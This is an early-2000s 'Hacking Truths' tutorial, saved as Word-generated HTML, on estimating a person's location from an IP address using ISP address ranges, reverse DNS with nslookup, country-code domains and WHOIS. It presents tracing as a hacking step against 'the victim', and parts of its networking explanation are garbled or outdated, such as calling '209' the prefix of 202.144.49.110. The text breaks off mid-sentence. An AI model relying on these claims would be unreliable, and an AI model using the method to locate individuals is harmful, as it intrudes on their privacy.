@@ -1,0 +1,564 @@
+<!-- saved from url=(0022)http://internet.e-mail -->
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="./geo_files/filelist.xml">
+<title>Tracing an IP, getting Geographical Information using an IP, IP Address, 
+nslookup, Reverse DNS, WHOIS, tracert, traceroute</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Ankit Fadia</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Ankit Fadia</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>129</o:TotalTime>
+  <o:Created>2000-11-23T10:05:00Z</o:Created>
+  <o:LastSaved>2000-11-23T10:05:00Z</o:LastSaved>
+  <o:Pages>6</o:Pages>
+  <o:Words>2434</o:Words>
+  <o:Characters>13874</o:Characters>
+  <o:Company>Hacking Truths</o:Company>
+  <o:Lines>115</o:Lines>
+  <o:Paragraphs>27</o:Paragraphs>
+  <o:CharactersWithSpaces>17038</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
+  <w:UseMarginsForDrawingGridOrigin/>
+  <w:Compatibility>
+   <w:FootnoteLayoutLikeWW8/>
+   <w:ShapeLayoutLikeWW8/>
+   <w:AlignTablesRowByRow/>
+   <w:ForgetLastTabAlignment/>
+   <w:LayoutRawTableWidth/>
+   <w:LayoutTableRowsApart/>
+  </w:Compatibility>
+ </w:WordDocument>
+</xml><![endif]--> 
+<style>
+<!--
+ /* Font Definitions */
+@font-face
+	{font-family:Wingdings;
+	panose-1:5 0 0 0 0 0 0 0 0 0;
+	mso-font-charset:2;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:0 268435456 0 0 -2147483648 0;}
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";
+	mso-bidi-font-family:"Times New Roman";}
+h1
+	{mso-style-next:Normal;
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:1;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-font-kerning:0pt;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+a:active {  text-decoration: none}
+a:hover {  text-decoration: underline}
+a:link {  text-decoration: none}
+a:visited {  text-decoration: none}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=#99CCFF vlink=#CCCCFF style='tab-interval:.5in' bgcolor="#000000" text="#CCCCCC" alink="#CCFF99" leftmargin="20" topmargin="20" marginwidth="20" marginheight="20">
+<div class=Section1>
+
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2" color="#FFFFFF">______________________________________________________________________________</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2" color="#FFFFFF"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <h1><font face="Arial, Helvetica, sans-serif" size="2" color="#FFFFFF">Getting 
+    geographical Information using an IP Address By Ankit Fadia <span
+style='font-weight:normal'><a href="mailto:ankit@bol.net.in"><b>ankit@bol.net.in</b></a></span></font></h1>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2" color="#FFFFFF">______________________________________________________________________________</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Getting 
+    the Internet Protocol or the IP Address of a remote system is said to the 
+    most important step in hacking of a system. Sometimes, however we get an IP 
+    in order to get more information on someone or some host. But, how can an 
+    IP Address be used to get more information on the location etc of a system? 
+    Well, this manual is aimed at answering just this question.</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Actually, 
+    the IP address (Actually the entire TCP/IP Protocol) is structured or designed 
+    such that one cannot tell as to in which country a system having the given 
+    IP is situated, by simply looking at it. An IP Address has no fields, which 
+    tell you the country in which the computer using it resides in. So, all myths 
+    like ‘The Second or the third field of an IP stands for the country in which 
+    the system using it resides’ are definitely false and untrue.</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">However, 
+    yes sometimes one can guess or deduce as to in which country and even in which 
+    city the system using an IP resides in, by simply looking at the first three 
+    fields of the IP. Let us take an example to understand what I mean to say 
+    by this. Now, before I move on the example, let us understand how exactly 
+    IP Addresses are awarded to you.</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Firstly, 
+    your ISP registers at the central authority and gets a particular range of 
+    IP addresses between which the various customers (people who dial into their 
+    servers) can be awarded IP addresses. Most ISP’s are given a Class C network 
+    Address. A class C Network address contains a 24-bit Network Prefix (the first 
+    three fields) and an 8-bit Host number (the last field). It is referred to 
+    as &quot;24's&quot; and is commonly used by most ISP's.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Verdana, Arial, Helvetica, sans-serif" size="2">******************<br>
+    </font><font face="Arial, Helvetica, sans-serif" size="2"> <font color="#FFFFFF"><b>HACKING 
+    TRUTH:</b></font> For the benefit of beginners, I have included below a snippet 
+    from one of my earlier manuals, which explains IP Addresses better: (Even 
+    if you are not a newbie, I do suggest you read the below snippet, as it might 
+    just be helpful.)</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Like 
+    in the real world, everyone has got an individual Home Address or telephone 
+    number so that, that particular individual can be contacted on that number 
+    or address, similarly all computers connected to the </font><font face="Arial, Helvetica, sans-serif" size="2">Internet 
+    are given a unique Internet Protocol or IP address which can be used to contact 
+    that particular computer. In geek language an IP address would be a decimal 
+    notation that divides the 32- bit Internet addresses (IP) into four 8-bit 
+    fields.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Does 
+    the IP address give me some information or do the numbers stand for anything?</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Let 
+    take the example of the following IP address: 202.144.49.110 Now the first 
+    part, the numbers before the first decimal i.e. 209 is the Network number 
+    or the Network Prefix.. This means that it identifies the number of the network 
+    in which the host is. The second part i.e. 144 is the Host Number that is 
+    it identifies the number of the host within the Network. This means that in 
+    the same Network, the network number is same. In order to provide flexibility 
+    in the size of the Network, here are different classes of IP addresses:</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Address 
+    Class<span style="mso-spacerun: yes">               </span>Dotted Decimal 
+    Notation Ranges</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Class 
+    A ( /8 Prefixes)<span style="mso-spacerun: yes">         </span>1.xxx.xxx.xxx 
+    through 126.xxx.xxx.xxx</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Class 
+    B ( /16 Prefixes)<span style="mso-spacerun: yes">        </span>128.0.xxx.xxx 
+    through 191.255.xxx.xxx</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Class 
+    C ( /24 Prefixes)<span style="mso-spacerun: yes">        </span>192.0.0.xxx 
+    through 223.255.255.xxx</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">The 
+    various classes will be clearer after reading the next few lines.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Each 
+    Class A Network Address contains a 8 bit Network Prefix followed by a 24-bit 
+    host number. They are considered to be primitive. They are referred to as 
+    &quot;/8''s&quot; or just &quot;8's&quot; as they have an 8-bit Network prefix.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">In 
+    a Class B Network Address there is a 16 bit Network Prefix followed by a 16-bit 
+    Host number. It is referred to as &quot;16's&quot;.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">A 
+    class C Network address contains a 24-bit Network Prefix and a 8 bit Host 
+    number. It is referred to as </font><font face="Arial, Helvetica, sans-serif" size="2">&quot;24's&quot; 
+    and is commonly used by most ISP's.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Due 
+    to the growing size of the Internet the Network Administrators faced many 
+    problems. The Internet routing tables were beginning to grow and now the administrators 
+    had to request another network number from the Internet before a new network 
+    could be installed at their site. This is where sub-netting came in. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Now 
+    if your ISP is a big one and if it provides you with dynamic IP addresses 
+    then you will most probably see that whenever you log on to the net, your 
+    IP address will have the same first 24 bits and only the last 8 bits will 
+    keep changing. This is due to the fact that when sub-netting comes in then 
+    the IP Addresses structure becomes:</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">xxx.xxx.zzz.yyy</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">where 
+    the first 2 parts are Network Prefix numbers and the zzz is the Subnet number 
+    and the yyy is the host number. So you are always connected to the same Subnet 
+    within the same Network. As a result the first 3 parts will remain the same 
+    and only the last part i.e. yyy is variable.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Verdana, Arial, Helvetica, sans-serif" size="2">***********************</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><span style="mso-spacerun: yes"> </span>For 
+    Example, if say an ISP xyz is given the IP: 203.98.12.xx Network address then 
+    you can be awarded any IP, whose first three fields are 203.98.12. Get it? 
+    </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">So, basically 
+    this means that each ISP has a particular range in which to allocate all its 
+    subscribers. Or in other words, all subscribers or all people connected to 
+    the internet using the same ISP, will have to be in this range. This in effect 
+    would mean that all people using the same ISP are likely to have the same 
+    first three fields of their IP Addresses. </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">This means 
+    that if you have done a lot of (By this I really mean a lot) of research, 
+    then you could figure out which ISP a person is using by simply looking at 
+    his IP. The ISP name could then be used to figure out the city and the country 
+    of the person. Right? Let me take an example to stress as to how cumbersome 
+    but easy (once the research is done) the above method can be.</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">In my 
+    country, say there are three main ISP’s:</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">ISP Name<span style='mso-tab-count:1'>               
+                    </span>Network Address Allotted</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">ISP I 
+    <span style='mso-tab-count:2'>                                </span><span
+style='mso-tab-count:1'>                </span>203.94.47.xx</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">ISP II<span style='mso-tab-count:2'>         
+                  </span><span
+style='mso-tab-count:1'>                         </span>202.92.12.xx</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">ISP III<span style='mso-tab-count:2'>         
+                         </span><span
+style='mso-tab-count:1'>                 </span>203.91.35.xx</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Now, if 
+    I get to know the IP of an e-pal of mine, and it reads: 203.91.35.12, then 
+    I can pretty easily figure out that he uses ISP III to connect to the internet. 
+    Right? You might say that any idiot would be able to do this. Well, yes and 
+    no. You see, the above method of finding out the ISP of a person was successful 
+    only because we already had the ISP and Network Address Allotted list with 
+    us. So, what my point is, that the above method can be successful only after 
+    a lot of research and experimentation. And, I do think such research can be 
+    helpful sometimes. </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Also, 
+    this would not work, if you take it all on in larger scale. What if the IP 
+    that you have belongs to someone living in a remote igloo in the North Pole? 
+    You could not possibly get the Network Addresses of all the ISP’s in the world, 
+    could you? </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2" color="#FFFFFF"><b>Note:</b></font><font face="Arial, Helvetica, sans-serif" size="2"> 
+    In the above case, you also get to know the city of the system using the given 
+    IP, as most ISP’s use different network addresses in different cities. Also, 
+    some ISP’s are operational in a single city. </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">So, 
+    is there a better method of getting the location of an IP? Yes, Reverse DNS 
+    lookups hold the key.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Just 
+    as DNS lookup converts the hostname into IP address, a Reverse DNS Lookup 
+    converts the IP address of a host to the hostname.<span style="mso-spacerun:
+yes"> </span>By hostname, what I mean to say is that it given us the name of the 
+    remote system in alphabets and numbers and periods.<span
+style="mso-spacerun: yes"> </span>For Example, mail2.bol.net.in would be a hostname, 
+    while 203.45.67.98 would not be a hostname. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">The 
+    popular and wonderful Unix utility ‘nslookup’ can be used for performing Reverse 
+    DNS lookups. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">So, 
+    if you using a *nix box or if you have access to a shell account, then the 
+    first this to do is to locate where the nslookup command is hidden by issuing 
+    the following command:</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><span
+style="mso-spacerun: yes"> </span>' whereis nslookup '</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Once 
+    you locate where the utility is hidden, you could easily use it to perform 
+    both normal and reverse DNS lookups. As this is not a manual on using the 
+    ‘nslookup’ command, I will simply giving a basic relevant outline. In order 
+    to get a more detailed description of how this works or how to use it, read 
+    the *nix man pages or the documentation. </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">We 
+    can use ‘nslookup’ to perform a reverse DNS lookup by mentioning the IP of 
+    the host at the prompt.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">For 
+    Example, </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">$&gt;nslookup 
+    IP Address</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><b><font color="#FFFFFF">Note: 
+    </font></b>The below IP’s and corresponding hostnames have been made up. They 
+    may not actually exist.</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Let us 
+    say, that above, instead of IP Address, we type 203.94.12.01 (which would 
+    be the IP I want to trace)</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">$&gt;nslookup<span style="mso-spacerun: yes">  
+    </span>203.94.12.01</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Then, 
+    you would receive a response similar to: mail2.bol.net.in </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Now, if 
+    you carefully look at the hostname that the Reverse DNS lookup, gave us, then 
+    the last part reveals the country in which system resides in. You see, the 
+    ‘.in’ part signifies that the system is located in India. All countries have 
+    been allotted country codes, which more often than not are the last part of 
+    the hostnames of the systems located in that country. This method can also 
+    be used to figure out as to which country a person lives in, if you know his 
+    email address. For Example, if a person has an email address ending in .ph 
+    then he probably lives in Philippines and if it ends in .il then he lives 
+    in Israel and so on. Some common country codes are:</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Country 
+    <span style='mso-tab-count:1'>                                </span>Code</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Australia<span style='mso-tab-count:1'>           
+          </span>.au</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Indonesia<span style='mso-tab-count:1'>                
+    </span>.id</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">India<span style='mso-tab-count:1'>       
+                    </span>.in</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Japan<span style='mso-tab-count:1'>      
+                   </span>.jp</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Israel<span style='mso-tab-count:1'>      
+                    </span>.il</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Britain<span style='mso-tab-count:1'>    
+                    </span>.uk</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">For a 
+    complete list of country codes, visit:</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><a href="http://www.alldomains.com/">http://www.alldomains.com</a> 
+    </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><a href="http://www.iana.org/domain-names.html">http://www.iana.org/domain-names.html</a></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Verdana, Arial, Helvetica, sans-serif" size="2">*****************<br>
+    </font><font face="Arial, Helvetica, sans-serif" size="2"> General Extra Tip: 
+    To get the complete list of US State Abbreviation codes, visit:</font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><a href="http://www.usps.gov/ncsc/lookups/abbr_state.txt">http://www.usps.gov/ncsc/lookups/abbr_state.txt</a></font></p>
+  <p class=MsoNormal><font face="Verdana, Arial, Helvetica, sans-serif" size="2">****************<br>
+    <br>
+    </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Windows 
+    users can perform Reverse DNS queries by downloading an utility called Samspade 
+    from: <a href="http://www.samspade.com/">www.samspade.com</a> </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">Another 
+    method of getting the exact geographical location of a system on the globe 
+    is by making use of the WHOIS database. The WHOIS database is basically the 
+    main database, which contains a variety of information like contact details, 
+    name etc on the person who owns a particular domain name. So, basically what 
+    one does in a WHOIS query, is supply the WHOIS service with the hostname on 
+    which he wants more information.<span style="mso-spacerun:
+yes"> </span>The WHOIS service then replies with the information stored in its 
+    database. </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">This method 
+    can be used to get some pretty accurate information on a particular IP or 
+    hostname; however, it is probably of no use if you are trying to point out 
+    the exact location of a dynamic IP. But, again this can be used to get atleast 
+    the city in which the ISP used by the victim is situated. </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2">You can 
+    carry out WHOIS queries at: <a
+href="http://www.alldomains.com/">http://www.allwhois.com</a> </font></p>
+  <p class=MsoNormal><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">You 
+    could also directly enter the following in the location bar of your Browser 
+    and perform a WHOIS enquiry.</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">Enter 
+    the following in the location bar of your browser:</font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><a
+href="http://205.177.25.9/cgi-bin/whois?abc.com">http://205.177.25.9/cgi-bin/whois?abc.com</a></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><b><font color="#FFFFFF">Note:</font></b> 
+    Replace abc.com with the domain name on which you want to perform a WHOIS 
+    query. </font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal style='mso-layout-grid-align:none;text-autospace:none'><font face="Arial, Helvetica, sans-serif" size="2">This 
+    method cannot be used to get the contact address of a person, if the IP that 
+    you use to trace him, belongs to his ISP. So, either you need to know the 
